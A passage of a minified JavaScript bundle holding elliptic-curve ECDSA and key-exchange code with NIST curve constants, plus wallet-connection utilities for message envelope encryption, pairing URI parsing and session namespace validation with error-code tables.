oe=r.mul(oe,ue),ue=r.add(J,re),oe=r.sub(oe,ue),ue=r.add(P,C),H=r.add(z,$),ue=r.mul(ue,H),H=r.add(ne,re),ue=r.sub(ue,H),V=r.mul(G,oe),H=r.mul(Z,re),V=r.add(H,V),H=r.sub(ne,V),V=r.add(ne,V),L=r.mul(H,V),ne=r.add(J,J),ne=r.add(ne,J),re=r.mul(G,re),oe=r.mul(Z,oe),ne=r.add(ne,re),re=r.sub(J,re),re=r.mul(G,re),oe=r.add(oe,re),J=r.mul(ne,oe),L=r.add(L,J),J=r.mul(ue,oe),H=r.mul(le,H),H=r.sub(H,J),J=r.mul(le,ne),V=r.mul(ue,V),V=r.add(V,J),new T(H,L,V)}subtract(N){return this.add(N.negate())}is0(){return this.equals(T.ZERO)}multiply(N){const{endo:q}=e;if(!i.isValidNot0(N))throw new Error("invalid scalar: out of range");let P,C;const j=z=>U.cached(this,z,$=>v9(T,$));if(q){const{k1neg:z,k1:$,k2neg:H,k2:L}=k(N),{p:V,f:G}=j($),{p:Z,f:J}=j(L);C=G.add(J),P=I(q.beta,V,Z,z,H)}else{const{p:z,f:$}=j(N);P=z,C=$}return v9(T,[P,C])[0]}multiplyUnsafe(N){const{endo:q}=e,P=this;if(!i.isValid(N))throw new Error("invalid scalar: out of range");if(N===bf||P.is0())return T.ZERO;if(N===t1)return P;if(U.hasCache(this))return this.multiply(N);if(q){const{k1neg:C,k1:j,k2neg:z,k2:$}=k(N),{p1:H,p2:L}=BSe(T,P,j,$);return I(q.beta,H,L,C,z)}else return U.unsafe(P,N)}multiplyAndAddUnsafe(N,q,P){const C=this.multiplyUnsafe(q).add(N.multiplyUnsafe(P));return C.is0()?void 0:C}toAffine(N){return O(this,N)}isTorsionFree(){const{isTorsionFree:N}=e;return o===t1?!0:N?N(T,this):U.unsafe(this,a).is0()}clearCofactor(){const{clearCofactor:N}=e;return o===t1?this:N?N(T,this):this.multiplyUnsafe(o)}isSmallOrder(){return this.multiplyUnsafe(o).is0()}toBytes(N=!0){return kx(N,"isCompressed"),this.assertValidity(),b(T,this,N)}toHex(N=!0){return e1(this.toBytes(N))}toString(){return`<Point ${this.is0()?"ZERO":this.toHex()}>`}get px(){return this.X}get py(){return this.X}get pz(){return this.Z}toRawBytes(N=!0){return this.toBytes(N)}_setWindowSize(N){this.precompute(N)}static normalizeZ(N){return v9(T,N)}static msm(N,q){return jSe(T,i,N,q)}static fromPrivateKey(N){return T.BASE.multiply(Hb(i,N))}}T.BASE=new T(s.Gx,s.Gy,r.ONE),T.ZERO=new T(r.ZERO,r.ONE,r.ZERO),T.Fp=r,T.Fn=i;const B=i.BITS,U=new DSe(T,e.endo?Math.ceil(B/2):B);return T.BASE.precompute(8),T}function yoe(t){return Uint8Array.of(t?2:3)}function boe(t,e){return{secretKey:e.BYTES,publicKey:1+t.BYTES,publicKeyUncompressed:1+2*t.BYTES,publicKeyHasPrefix:!0,signature:2*e.BYTES}}function QSe(t,e={}){const{Fn:n}=t,r=e.randomBytes||Hg,i=Object.assign(boe(t.Fp,n),{seed:foe(n.ORDER)});function s(m){try{return!!Hb(n,m)}catch{return!1}}function o(m,b){const{publicKey:w,publicKeyUncompressed:y}=i;try{const E=m.length;return b===!0&&E!==w||b===!1&&E!==y?!1:!!t.fromBytes(m)}catch{return!1}}function a(m=r(i.seed)){return NSe(Mm(m,i.seed,"seed"),n.ORDER)}function c(m,b=!0){return t.BASE.multiply(Hb(n,m)).toBytes(b)}function l(m){const b=a(m);return{secretKey:b,publicKey:c(b)}}function f(m){if(typeof m=="bigint")return!1;if(m instanceof t)return!0;const{secretKey:b,publicKey:w,publicKeyUncompressed:y}=i;if(n.allowedLengths||b===w)return;const E=Vs("key",m).length;return E===w||E===y}function h(m,b,w=!0){if(f(m)===!0)throw new Error("first arg must be private key");if(f(b)===!1)throw new Error("second arg must be public key");const y=Hb(n,m);return t.fromHex(b).multiply(y).toBytes(w)}return Object.freeze({getPublicKey:c,getSharedSecret:h,keygen:l,Point:t,utils:{isValidSecretKey:s,isValidPublicKey:o,randomSecretKey:a,isValidPrivateKey:s,randomPrivateKey:a,normPrivateKeyToScalar:m=>Hb(n,m),precompute(m=8,b=t.BASE){return b.precompute(m,!1)}},lengths:i})}function JSe(t,e,n={}){YI(e),r8(n,{},{hmac:"function",lowS:"boolean",randomBytes:"function",bits2int:"function",bits2int_modN:"function"});const r=n.randomBytes||Hg,i=n.hmac||((q,...P)=>e8(e,q,fp(...P))),{Fp:s,Fn:o}=t,{ORDER:a,BITS:c}=o,{keygen:l,getPublicKey:f,getSharedSecret:h,utils:m,lengths:b}=QSe(t,n),w={prehash:!1,lowS:typeof n.lowS=="boolean"?n.lowS:!1,format:void 0,extraEntropy:!1},y="compact";function E(q){const P=a>>t1;return q>P}function A(q,P){if(!o.isValidNot0(P))throw new Error(`invalid signature ${q}: out of range 1..Point.Fn.ORDER`);return P}function R(q,P){m7(P);const C=b.signature,j=P==="compact"?C:P==="recovered"?C+1:void 0;return Mm(q,j,`${P} signature`)}class S{constructor(P,C,j){this.r=A("r",P),this.s=A("s",C),j!=null&&(this.recovery=j),Object.freeze(this)}static fromBytes(P,C=y){R(P,C);let j;if(C==="der"){const{r:L,s:V}=ff.toSig(Mm(P));return new S(L,V)}C==="recovered"&&(j=P[0],C="compact",P=P.subarray(1));const z=o.BYTES,$=P.subarray(0,z),H=P.subarray(z,z*2);return new S(o.fromBytes($),o.fromBytes(H),j)}static fromHex(P,C){return this.fromBytes(Nx(P),C)}addRecoveryBit(P){return new S(this.r,this.s,P)}recoverPublicKey(P){const C=s.ORDER,{r:j,s:z,recovery:$}=this;if($==null||![0,1,2,3].includes($))throw new Error("recovery id invalid");if(a*goe<C&&$>1)throw new Error("recovery id is ambiguous for h>1 curve");const H=$===2||$===3?j+a:j;if(!s.isValid(H))throw new Error("recovery id 2 or 3 invalid");const L=s.toBytes(H),V=t.fromBytes(fp(yoe(($&1)===0),L)),G=o.inv(H),Z=k(Vs("msgHash",P)),J=o.create(-Z*G),ne=o.create(z*G),re=t.BASE.multiplyUnsafe(J).add(V.multiplyUnsafe(ne));if(re.is0())throw new Error("point at infinify");return re.assertValidity(),re}hasHighS(){return E(this.s)}toBytes(P=y){if(m7(P),P==="der")return Nx(ff.hexFromSig(this));const C=o.toBytes(this.r),j=o.toBytes(this.s);if(P==="recovered"){if(this.recovery==null)throw new Error("recovery bit must be present");return fp(Uint8Array.of(this.recovery),C,j)}return fp(C,j)}toHex(P){return e1(this.toBytes(P))}assertValidity(){}static fromCompact(P){return S.fromBytes(Vs("sig",P),"compact")}static fromDER(P){return S.fromBytes(Vs("sig",P),"der")}normalizeS(){return this.hasHighS()?new S(this.r,o.neg(this.s),this.recovery):this}toDERRawBytes(){return this.toBytes("der")}toDERHex(){return e1(this.toBytes("der"))}toCompactRawBytes(){return this.toBytes("compact")}toCompactHex(){return e1(this.toBytes("compact"))}}const v=n.bits2int||function(q){if(q.length>8192)throw new Error("input is too large");const P=n8(q),C=q.length*8-c;return C>0?P>>BigInt(C):P},k=n.bits2int_modN||function(q){return o.create(v(q))},O=tA(c);function _(q){return h7("num < 2^"+c,q,bf,O),o.toBytes(q)}function I(q,P){return Mm(q,void 0,"message"),P?Mm(e(q),void 0,"prehashed message"):q}function T(q,P,C){if(["recovered","canonical"].some(ne=>ne in C))throw new Error("sign() legacy options not supported");const{lowS:j,prehash:z,extraEntropy:$}=C9(C,w);q=I(q,z);const H=k(q),L=Hb(o,P),V=[_(L),_(H)];if($!=null&&$!==!1){const ne=$===!0?r(b.secretKey):$;V.push(Vs("extraEntropy",ne))}const G=fp(...V),Z=H;function J(ne){const re=v(ne);if(!o.isValidNot0(re))return;const le=o.inv(re),oe=t.BASE.multiply(re).toAffine(),ue=o.create(oe.x);if(ue===bf)return;const be=o.create(le*o.create(Z+ue*L));if(be===bf)return;let Me=(oe.x===ue?0:2)|Number(oe.y&t1),Te=be;return j&&E(be)&&(Te=o.neg(be),Me^=1),new S(ue,Te,Me)}return{seed:G,k2sig:J}}function B(q,P,C={}){q=Vs("message",q);const{seed:j,k2sig:z}=T(q,P,C);return _Se(e.outputLen,o.BYTES,i)(j,z)}function U(q){let P;const C=typeof q=="string"||ZI(q),j=!C&&q!==null&&typeof q=="object"&&typeof q.r=="bigint"&&typeof q.s=="bigint";if(!C&&!j)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");if(j)P=new S(q.r,q.s);else if(C){try{P=S.fromBytes(Vs("sig",q),"der")}catch(z){if(!(z instanceof ff.Err))throw z}if(!P)try{P=S.fromBytes(Vs("sig",q),"compact")}catch{return!1}}return P||!1}function M(q,P,C,j={}){const{lowS:z,prehash:$,format:H}=C9(j,w);if(C=Vs("publicKey",C),P=I(Vs("message",P),$),"strict"in j)throw new Error("options.strict was renamed to lowS");const L=H===void 0?U(q):S.fromBytes(Vs("sig",q),H);if(L===!1)return!1;try{const V=t.fromBytes(C);if(z&&L.hasHighS())return!1;const{r:G,s:Z}=L,J=k(P),ne=o.inv(Z),re=o.create(J*ne),le=o.create(G*ne),oe=t.BASE.multiplyUnsafe(re).add(V.multiplyUnsafe(le));return oe.is0()?!1:o.create(oe.x)===G}catch{return!1}}function N(q,P,C={}){const{prehash:j}=C9(C,w);return P=I(P,j),S.fromBytes(q,"recovered").recoverPublicKey(P).toBytes()}return Object.freeze({keygen:l,getPublicKey:f,getSharedSecret:h,utils:m,lengths:b,Point:t,sign:B,verify:M,recoverPublicKey:N,Signature:S,hash:e})}function XSe(t){const e={a:t.a,b:t.b,p:t.Fp.ORDER,n:t.n,h:t.h,Gx:t.Gx,Gy:t.Gy},n=t.Fp;let r=t.allowedPrivateKeyLengths?Array.from(new Set(t.allowedPrivateKeyLengths.map(o=>Math.ceil(o/2)))):void 0;const i=Kp(e.n,{BITS:t.nBitLength,allowedLengths:r,modFromBytes:t.wrapPrivateKey}),s={Fp:n,Fn:i,allowInfinityPoint:t.allowInfinityPoint,endo:t.endo,isTorsionFree:t.isTorsionFree,clearCofactor:t.clearCofactor,fromBytes:t.fromBytes,toBytes:t.toBytes};return{CURVE:e,curveOpts:s}}function e4e(t){const{CURVE:e,curveOpts:n}=XSe(t),r={hmac:t.hmac,randomBytes:t.randomBytes,lowS:t.lowS,bits2int:t.bits2int,bits2int_modN:t.bits2int_modN};return{CURVE:e,curveOpts:n,hash:t.hash,ecdsaOpts:r}}function t4e(t,e){const n=e.Point;return Object.assign({},e,{ProjectivePoint:n,CURVE:Object.assign({},t,loe(n.Fn.ORDER,n.Fn.BITS))})}function n4e(t){const{CURVE:e,curveOpts:n,hash:r,ecdsaOpts:i}=e4e(t),s=YSe(e,n),o=JSe(s,r,i);return t4e(t,o)}function g7(t,e){const n=r=>n4e({...t,hash:r});return{...n(e),create:n}}const woe={p:BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"),n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),h:BigInt(1),a:BigInt("0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc"),b:BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5")},voe={p:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff"),n:BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973"),h:BigInt(1),a:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc"),b:BigInt("0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef"),Gx:BigInt("0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7"),Gy:BigInt("0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f")},Eoe={p:BigInt("0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),n:BigInt("0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409"),h:BigInt(1),a:BigInt("0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc"),b:BigInt("0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00"),Gx:BigInt("0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66"),Gy:BigInt("0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650")},r4e=Kp(woe.p),i4e=Kp(voe.p),s4e=Kp(Eoe.p),o4e=g7({...woe,Fp:r4e,lowS:!1},JI);g7({...voe,Fp:i4e,lowS:!1},dCe),g7({...Eoe,Fp:s4e,lowS:!1,allowedPrivateKeyLengths:[130,131,132]},lCe);const a4e=o4e,_oe="base10",vo="base16",Yo="base64pad",hp="base64url",nA="utf8",Aoe=0,Af=1,rA=2,c4e=0,vq=1,oE=12,kB=32;function u4e(){const t=p7.utils.randomPrivateKey(),e=p7.getPublicKey(t);return{privateKey:ta(t,vo),publicKey:ta(e,vo)}}function y7(){const t=Hg(kB);return ta(t,vo)}function l4e(t,e){const n=p7.getSharedSecret(Mc(t,vo),Mc(e,vo)),r=vSe(t8,n,void 0,void 0,kB);return ta(r,vo)}function WT(t){const e=t8(Mc(t,vo));return ta(e,vo)}function Pc(t){const e=t8(Mc(t,nA));return ta(e,vo)}function Coe(t){return Mc(`${t}`,_oe)}function cg(t){return Number(ta(t,_oe))}function Soe(t){return t.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function Toe(t){const e=t.replace(/-/g,"+").replace(/_/g,"/"),n=(4-e.length%4)%4;return e+"=".repeat(n)}function d4e(t){const e=Coe(typeof t.type<"u"?t.type:Aoe);if(cg(e)===Af&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const n=typeof t.senderPublicKey<"u"?Mc(t.senderPublicKey,vo):void 0,r=typeof t.iv<"u"?Mc(t.iv,vo):Hg(oE),i=Mc(t.symKey,vo),s=Jse(i,r).encrypt(Mc(t.message,nA)),o=xoe({type:e,sealed:s,iv:r,senderPublicKey:n});return t.encoding===hp?Soe(o):o}function f4e(t){const e=Mc(t.symKey,vo),{sealed:n,iv:r}=l_({encoded:t.encoded,encoding:t.encoding}),i=Jse(e,r).decrypt(n);if(i===null)throw new Error("Failed to decrypt");return ta(i,nA)}function h4e(t,e){const n=Coe(rA),r=Hg(oE),i=Mc(t,nA),s=xoe({type:n,sealed:i,iv:r});return e===hp?Soe(s):s}function p4e(t,e){const{sealed:n}=l_({encoded:t,encoding:e});return ta(n,nA)}function xoe(t){if(cg(t.type)===rA)return ta(sE([t.type,t.sealed]),Yo);if(cg(t.type)===Af){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return ta(sE([t.type,t.senderPublicKey,t.iv,t.sealed]),Yo)}return ta(sE([t.type,t.iv,t.sealed]),Yo)}function l_(t){const e=(t.encoding||Yo)===hp?Toe(t.encoded):t.encoded,n=Mc(e,Yo),r=n.slice(c4e,vq),i=vq;if(cg(r)===Af){const c=i+kB,l=c+oE,f=n.slice(i,c),h=n.slice(c,l),m=n.slice(l);return{type:r,sealed:m,iv:h,senderPublicKey:f}}if(cg(r)===rA){const c=n.slice(i),l=Hg(oE);return{type:r,sealed:c,iv:l}}const s=i+oE,o=n.slice(i,s),a=n.slice(s);return{type:r,sealed:a,iv:o}}function m4e(t,e){const n=l_({encoded:t,encoding:e?.encoding});return Ioe({type:cg(n.type),senderPublicKey:typeof n.senderPublicKey<"u"?ta(n.senderPublicKey,vo):void 0,receiverPublicKey:e?.receiverPublicKey})}function Ioe(t){const e=t?.type||Aoe;if(e===Af){if(typeof t?.senderPublicKey>"u")throw new Error("missing sender public key");if(typeof t?.receiverPublicKey>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t?.senderPublicKey,receiverPublicKey:t?.receiverPublicKey}}function Eq(t){return t.type===Af&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}function _q(t){return t.type===rA}function g4e(t){const e=Buffer.from(t.x,"base64"),n=Buffer.from(t.y,"base64");return sE([new Uint8Array([4]),e,n])}function y4e(t,e){const[n,r,i]=t.split("."),s=Buffer.from(Toe(i),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${n}.${r}`,l=t8(c),f=g4e(e);if(!a4e.verify(sE([o,a]),l,f))throw new Error("Invalid signature");return Zk(t).payload}const b4e="irn";function jx(t){return t?.relay||{protocol:b4e}}function zb(t){const e=J3e[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}var w4e=Object.defineProperty,v4e=Object.defineProperties,E4e=Object.getOwnPropertyDescriptors,Aq=Object.getOwnPropertySymbols,_4e=Object.prototype.hasOwnProperty,A4e=Object.prototype.propertyIsEnumerable,Cq=(t,e,n)=>e in t?w4e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,S9=(t,e)=>{for(var n in e||(e={}))_4e.call(e,n)&&Cq(t,n,e[n]);if(Aq)for(var n of Aq(e))A4e.call(e,n)&&Cq(t,n,e[n]);return t},C4e=(t,e)=>v4e(t,E4e(e));function S4e(t,e="-"){const n={},r="relay"+e;return Object.keys(t).forEach(i=>{if(i.startsWith(r)){const s=i.replace(r,""),o=t[i];n[s]=o}}),n}function Sq(t){if(!t.includes("wc:")){const l=Nse(t);l!=null&&l.includes("wc:")&&(t=l)}t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),n=t.indexOf("?")!==-1?t.indexOf("?"):void 0,r=t.substring(0,e),i=t.substring(e+1,n).split("@"),s=typeof n<"u"?t.substring(n):"",o=new URLSearchParams(s),a=Object.fromEntries(o.entries()),c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:r,topic:T4e(i[0]),version:parseInt(i[1],10),symKey:a.symKey,relay:S4e(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function T4e(t){return t.startsWith("//")?t.substring(2):t}function x4e(t,e="-"){const n="relay",r={};return Object.keys(t).forEach(i=>{const s=i,o=n+e+s;t[s]&&(r[o]=t[s])}),r}function Tq(t){const e=new URLSearchParams,n=S9(S9(C4e(S9({},x4e(t.relay)),{symKey:t.symKey}),t.expiryTimestamp&&{expiryTimestamp:t.expiryTimestamp.toString()}),t.methods&&{methods:t.methods.join(",")});return Object.entries(n).sort(([r],[i])=>r.localeCompare(i)).forEach(([r,i])=>{i!==void 0&&e.append(r,String(i))}),`${t.protocol}:${t.topic}@${t.version}?${e}`}function K3(t,e,n){return`${t}?wc_ev=${n}&topic=${e}`}var I4e=Object.defineProperty,R4e=Object.defineProperties,P4e=Object.getOwnPropertyDescriptors,xq=Object.getOwnPropertySymbols,N4e=Object.prototype.hasOwnProperty,O4e=Object.prototype.propertyIsEnumerable,Iq=(t,e,n)=>e in t?I4e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,k4e=(t,e)=>{for(var n in e||(e={}))N4e.call(e,n)&&Iq(t,n,e[n]);if(xq)for(var n of xq(e))O4e.call(e,n)&&Iq(t,n,e[n]);return t},D4e=(t,e)=>R4e(t,P4e(e));function sw(t){const e=[];return t.forEach(n=>{const[r,i]=n.split(":");e.push(`${r}:${i}`)}),e}function Roe(t){const e=[];return Object.values(t).forEach(n=>{e.push(...sw(n.accounts))}),[...new Set(e)]}function B4e(t){const e=[];return Object.values(t).forEach(n=>{e.push(...n.methods)}),[...new Set(e)]}function j4e(t){const e=[];return Object.values(t).forEach(n=>{e.push(...n.events)}),[...new Set(e)]}function M4e(t,e){const n=[];return Object.values(t).forEach(r=>{sw(r.accounts).includes(e)&&n.push(...r.methods)}),n}function U4e(t,e){const n=[];return Object.values(t).forEach(r=>{sw(r.accounts).includes(e)&&n.push(...r.events)}),n}function i8(t){return t.includes(":")}function qb(t){return i8(t)?t.split(":")[0]:t}function Rq(t){var e,n,r;const i={};if(!Fl(t))return i;for(const[s,o]of Object.entries(t)){const a=i8(s)?[s]:o.chains,c=o.methods||[],l=o.events||[],f=qb(s);i[f]=D4e(k4e({},i[f]),{chains:Ll(a,(e=i[f])==null?void 0:e.chains),methods:Ll(c,(n=i[f])==null?void 0:n.methods),events:Ll(l,(r=i[f])==null?void 0:r.events)})}return i}function L4e(t){const e={};return t?.forEach(n=>{var r;const[i,s]=n.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[],methods:[]}),e[i].accounts.push(n),(r=e[i].chains)==null||r.push(`${i}:${s}`)}),e}function Pq(t,e){e=e.map(r=>r.replace("did:pkh:",""));const n=L4e(e);for(const[r,i]of Object.entries(n))i.methods?i.methods=Ll(i.methods,t):i.methods=t,i.events=["chainChanged","accountsChanged"];return n}function F4e(t,e){var n,r,i,s,o,a;const c=Rq(t),l=Rq(e),f={},h=Object.keys(c).concat(Object.keys(l));for(const m of h)f[m]={chains:Ll((n=c[m])==null?void 0:n.chains,(r=l[m])==null?void 0:r.chains),methods:Ll((i=c[m])==null?void 0:i.methods,(s=l[m])==null?void 0:s.methods),events:Ll((o=c[m])==null?void 0:o.events,(a=l[m])==null?void 0:a.events)};return f}const $4e={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},H4e={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function Xe(t,e){const{message:n,code:r}=H4e[t];return{message:e?`${n} ${e}`:n,code:r}}function Ur(t,e){const{message:n,code:r}=$4e[t];return{message:e?`${n} ${e}`:n,code:r}}function Cf(t,e){return!!Array.isArray(t)}function Fl(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function es(t){return typeof t>"u"}function Ni(t,e){return e&&es(t)?!0:typeof t=="string"&&!!t.trim().length}function DB(t,e){return typeof t=="number"&&!isNaN(t)}function z4e(t,e){const{requiredNamespaces:n}=e,r=Object.keys(t.namespaces),i=Object.keys(n);let s=!0;return jm(i,r)?(r.forEach(o=>{const{accounts:a,methods:c,events:l}=t.namespaces[o],f=sw(a),h=n[o];(!jm(Tse(o,h),f)||!jm(h.methods,c)||!jm(h.events,l))&&(s=!1)}),s):!1}function Mx(t){return Ni(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function q4e(t){if(Ni(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const n=e[0]+":"+e[1];return!!e[2]&&Mx(n)}}return!1}function V4e(t){function e(n){try{return typeof new URL(n)<"u"}catch{return!1}}try{if(Ni(t,!1)){if(e(t))return!0;const n=Nse(t);return e(n)}}catch{}return!1}function W4e(t){var e;return(e=t?.proposer)==null?void 0:e.publicKey}function G4e(t){return t?.topic}function K4e(t,e){let n=null;return Ni(t?.publicKey,!1)||(n=Xe("MISSING_OR_INVALID",`${e} controller public key should be a string`)),n}function Nq(t){let e=!0;return Cf(t)?t.length&&(e=t.every(n=>Ni(n,!1))):e=!1,e}function Z4e(t,e,n){let r=null;return Cf(e)&&e.length?e.forEach(i=>{r||Mx(i)||(r=Ur("UNSUPPORTED_CHAINS",`${n}, chain ${i} should be a string and conform to "namespace:chainId" format`))}):Mx(t)||(r=Ur("UNSUPPORTED_CHAINS",`${n}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),r}function Y4e(t,e,n){let r=null;return Object.entries(t).forEach(([i,s])=>{if(r)return;const o=Z4e(i,Tse(i,s),`${e} ${n}`);o&&(r=o)}),r}function Q4e(t,e){let n=null;return Cf(t)?t.forEach(r=>{n||q4e(r)||(n=Ur("UNSUPPORTED_ACCOUNTS",`${e}, account ${r} should be a string and conform to "namespace:chainId:address" format`))}):n=Ur("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),n}function J4e(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=Q4e(r?.accounts,`${e} namespace`);i&&(n=i)}),n}function X4e(t,e){let n=null;return Nq(t?.methods)?Nq(t?.events)||(n=Ur("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):n=Ur("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),n}function Poe(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=X4e(r,`${e}, namespace`);i&&(n=i)}),n}function eTe(t,e,n){let r=null;if(t&&Fl(t)){const i=Poe(t,e);i&&(r=i);const s=Y4e(t,e,n);s&&(r=s)}else r=Xe("MISSING_OR_INVALID",`${e}, ${n} should be an object with data`);return r}function T9(t,e){let n=null;if(t&&Fl(t)){const r=Poe(t,e);r&&(n=r);const i=J4e(t,e);i&&(n=i)}else n=Xe("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return n}function Noe(t){return Ni(t.protocol,!0)}function tTe(t,e){let n=!1;return t?t&&Cf(t)&&t.length&&t.forEach(r=>{n=Noe(r)}):n=!0,n}function nTe(t){return typeof t=="number"}function Wo(t){return typeof t<"u"&&typeof t!==null}function rTe(t){return!(!t||typeof t!="object"||!t.code||!DB(t.code)||!t.message||!Ni(t.message,!1))}function iTe(t){return!(es(t)||!Ni(t.method,!1))}function sTe(t){return!(es(t)||es(t.result)&&es(t.error)||!DB(t.id)||!Ni(t.jsonrpc,!1))}function oTe(t){return!(es(t)||!Ni(t.name,!1))}function Oq(t,e){return!(!Mx(e)||!Roe(t).includes(e))}function aTe(t,e,n){return Ni(n,!1)?M4e(t,e).includes(n):!1}function cTe(t,e,n){return Ni(n,!1)?U4e(t,e).includes(n):!1}function kq(t,e,n){let r=null;const i=uTe(t),s=lTe(e),o=Object.keys(i),a=Object.keys(s),c=Dq(Object.keys(t)),l=Dq(Object.keys(e)),f=c.filter(h=>!l.includes(h));return f.length&&(r=Xe("NON_CONFORMING_NAMESPACES",`${n} namespaces keys don't satisfy requiredNamespaces.
      Required: ${f.toString()}
      Received: ${Object.keys(e).toString()}`)),jm(o,a)||(r=Xe("NON_CONFORMING_NAMESPACES",`${n} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(h=>{if(!h.includes(":")||r)return;const m=sw(e[h].accounts);m.includes(h)||(r=Xe("NON_CONFORMING_NAMESPACES",`${n} namespaces accounts don't satisfy namespace accounts for ${h}
        Required: ${h}
